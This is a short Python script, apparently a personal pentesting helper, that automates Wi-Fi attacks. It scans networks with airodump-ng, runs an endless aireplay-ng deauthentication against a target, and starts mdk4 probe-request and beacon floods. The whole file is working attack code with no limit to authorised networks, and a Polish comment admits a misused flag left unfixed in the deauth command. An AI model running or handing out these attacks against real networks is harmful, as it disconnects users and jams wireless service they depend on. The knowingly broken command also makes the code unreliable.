# scripts/pentests.py
import time
import subprocess
import random
import string
import os

def scan_wifi(interface, seconds=30, out_dir="data/scans"):
    os.makedirs(out_dir, exist_ok=True)
    base = os.path.join(out_dir, f"wifi_scan{time.strftime('%Y%m%d_%H%M%S')}")

    p = subprocess.Popen([
        "airodump-ng", interface,
        "--write", base,
        "--output-format", "csv",
    ])
    time.sleep(seconds)
    p.terminate()
    subprocess.run(["pkill", "airodump-ng"], check=False)

def deauth(target_bssid, interface, out_dir="data/attacks"):
    os.makedirs(out_dir, exist_ok=True)
    ts = time.strftime('%Y%m%d_%H%M%S')
    log_path = os.path.join(out_dir, f"deauth_{ts}.log")

    # (UWAGA: w aireplay-ng -c to klient, nie interfejs; ale zostawiam jak masz)
    cmd = ["aireplay-ng", "--deauth", "0"]
    if target_bssid.strip():
        cmd += ["-c", target_bssid]
    cmd += [interface]

    with open(log_path, "w") as log:
        subprocess.run(cmd, stdout=log, stderr=log, check=False)

def probe_request_flood(interface, seconds=10, out_dir="data/attacks"):
    os.makedirs(out_dir, exist_ok=True)
    ssid = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    ts = time.strftime('%Y%m%d_%H%M%S')
    log_path = os.path.join(out_dir, f"probe_flood_{ts}.log")

    p = subprocess.Popen(["mdk4", interface, "p", "-s", ssid, "-c", "1"],
                         stdout=open(log_path, "w"), stderr=subprocess.STDOUT)
    time.sleep(seconds)
    p.terminate()
    subprocess.run(["pkill", "mdk4"], check=False)

def beacon_flood(interface, seconds=10, out_dir="data/attacks"):
    os.makedirs(out_dir, exist_ok=True)
    ssid = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    ts = time.strftime('%Y%m%d_%H%M%S')
    log_path = os.path.join(out_dir, f"beacon_flood_{ts}.log")

    p = subprocess.Popen(["mdk4", interface, "bv", "-s", ssid, "-c", "1"],
                         stdout=open(log_path, "w"), stderr=subprocess.STDOUT)
    time.sleep(seconds)
    p.terminate()
    subprocess.run(["pkill", "mdk4"], check=False)
